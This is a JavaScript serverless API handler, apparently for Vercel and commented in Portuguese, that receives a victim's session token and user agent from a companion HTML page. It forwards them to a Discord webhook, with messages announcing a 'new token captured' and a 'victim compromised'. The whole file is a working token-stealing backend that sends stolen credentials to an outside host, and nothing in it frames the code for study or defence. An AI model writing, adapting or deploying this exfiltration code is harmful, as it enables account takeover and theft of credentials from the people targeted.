export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { token, ua } = req.body;
        
        // --- CONFIGURAÇÃO ---
        const WEBHOOK_URL = "https://discord.com/api/webhooks/SEU_ID/AQUI_TOKEN"; // COPIE O MESMO WEBHOOK DO HTML

        if (!token) {
            return res.status(200).json({ status: "no_token" });
        }

        const payload = {
            content: `💀 **NOVO TOKEN CAPTURADO!** 💀\n\n**Token:**\n\`\`\`\n${token}\n\`\`\``,
            embeds: [{
                title: "🔥 VÍTIMA COMPROMETIDA 🔥",
                color: 16753920,
                fields: [{ name: "User Agent", value: ua || "Unknown" }]
            }],
            username: "XORTRON_VERCEL"
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            res.status(200).json({ status: "captured" });
        } catch (error) {
            res.status(500).json({ error: "Webhook failed" });
        }
    } else {
        res.status(405).json({ error: "Method Not Allowed" });
    }
}
